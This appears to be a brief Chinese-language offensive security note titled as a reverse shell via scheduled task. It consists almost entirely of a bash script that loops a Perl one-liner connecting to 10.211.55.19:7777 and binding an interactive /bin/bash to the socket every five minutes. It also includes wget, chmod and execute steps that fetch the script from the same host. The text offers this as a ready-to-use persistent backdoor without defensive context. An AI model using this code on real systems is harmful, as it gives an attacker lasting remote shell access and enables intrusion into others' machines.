# 基于计划任务的反弹shell

```bash
vim 1.sh 
----------------------------
while true; do
    perl -e 'use Socket;$i="10.211.55.19";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
    # sleep for 300 seconds (5 mins)
    sleep 300
done
----------------------------
wget http://10.211.55.19:8081/1.sh
chmod +x 1.sh
./1.sh
```

‍
